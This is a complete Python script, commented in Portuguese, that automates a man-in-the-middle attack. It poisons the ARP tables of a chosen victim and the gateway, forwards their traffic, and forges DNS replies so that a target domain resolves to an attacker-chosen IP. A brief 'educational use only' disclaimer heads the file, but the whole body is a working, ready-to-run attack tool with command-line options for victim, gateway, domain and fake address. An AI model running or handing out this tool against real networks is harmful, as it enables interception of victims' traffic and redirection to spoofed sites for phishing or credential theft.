#!/usr/bin/env python3
# =====================================================================
# AVISO LEGAL:
# Ferramenta para MITM e DNS Spoofing. Uso estritamente educacional.
# Teste apenas em redes controladas ou de sua propriedade.
# =====================================================================
from scapy.all import *
from colorama import Fore, init
import threading
import time
import argparse
import sys

init(autoreset=True)

def obter_mac(ip):
    """Descobre o MAC de um IP na rede local."""
    pacote = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, op=1)
    resposta, _ = srp(pacote, timeout=2, verbose=False)
    for _, recebido in resposta:
        return recebido.hwsrc
    return None

def envenenar_arp(ip_vitima, ip_gateway, mac_vitima, mac_gateway):
    """Thread que mantém o envenenamento ARP ativo."""
    pacote_vitima = ARP(op=2, pdst=ip_vitima, hwdst=mac_vitima, psrc=ip_gateway)
    pacote_gateway = ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_vitima)
    
    while True:
        send(pacote_vitima, verbose=False)
        send(pacote_gateway, verbose=False)
        time.sleep(2)

def processar_dns(pacote, dominio_alvo, ip_falso):
    """Função que intercepta o DNS e forja a resposta."""
    if pacote.haslayer(DNS) and pacote[DNS].qr == 0:
        try:
            dominio = pacote[DNS].qd.qname.decode('utf-8')
            if dominio_alvo in dominio:
                print(Fore.RED + f"[!] Interceptado: {dominio} | Redirecionando para {ip_falso}")
                
               
                resposta = (
                    IP(src=pacote[IP].dst, dst=pacote[IP].src) /
                    UDP(sport=53, dport=pacote[UDP].sport) /
                    DNS(id=pacote[DNS].id, qr=1, aa=1, qd=pacote[DNS].qd, 
                        an=DNSRR(rrname=pacote[DNS].qd.qname, ttl=10, rdata=ip_falso))
                )
                send(resposta, verbose=False)
        except Exception:
            pass

def restaurar_arp(ip_vitima, ip_gateway, mac_vitima, mac_gateway):
    """Restaura as tabelas ARP após o ataque."""
    print(Fore.YELLOW + "\n[!] Restaurando tabelas ARP...")
    pacote_vitima = ARP(op=2, pdst=ip_vitima, hwdst=mac_vitima, psrc=ip_gateway, hwsrc=mac_gateway)
    pacote_gateway = ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_vitima, hwsrc=mac_vitima)
    for _ in range(5):
        send(pacote_vitima, verbose=False)
        send(pacote_gateway, verbose=False)
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="MITM (ARP) + DNS Spoofing Automatizado")
    parser.add_argument("-v", "--vitima", required=True, help="IP da vítima")
    parser.add_argument("-g", "--gateway", required=True, help="IP do roteador")
    parser.add_argument("-d", "--domain", required=True, help="Domínio para sequestrar")
    parser.add_argument("-i", "--ip", required=True, help="IP falso de destino")
    parser.add_argument("-if", "--interface", default="wlan0", help="Interface de rede")
    args = parser.parse_args()

    print(Fore.CYAN + "[*] Resolvendo MACs...")
    mac_vitima = obter_mac(args.vitima)
    mac_gateway = obter_mac(args.gateway)

    if not mac_vitima or not mac_gateway:
        print(Fore.RED + "[-] Erro: Não foi possível achar os MACs. Verifique os IPs.")
        sys.exit(1)

    print(Fore.GREEN + f"[+] MAC Vítima: {mac_vitima} | MAC Gateway: {mac_gateway}")
    
    
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print(Fore.YELLOW + "[*] IP Forwarding ativado. Tráfego não-DNS será repassado.")

    
    thread_arp = threading.Thread(target=envenenar_arp, args=(args.vitima, args.gateway, mac_vitima, mac_gateway), daemon=True)
    thread_arp.start()

    try:
        print(Fore.CYAN + f"[*] Escutando DNS para sequestrar {args.domain}...")
        sniff(iface=args.interface, filter=f"udp port 53 and host {args.vitima}", 
              prn=lambda x: processar_dns(x, args.domain, args.ip), store=0)
    except KeyboardInterrupt:
        restaurar_arp(args.vitima, args.gateway, mac_vitima, mac_gateway)
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print(Fore.GREEN + "\n[+] Ataque finalizado com sucesso.")

if __name__ == "__main__":
    main()
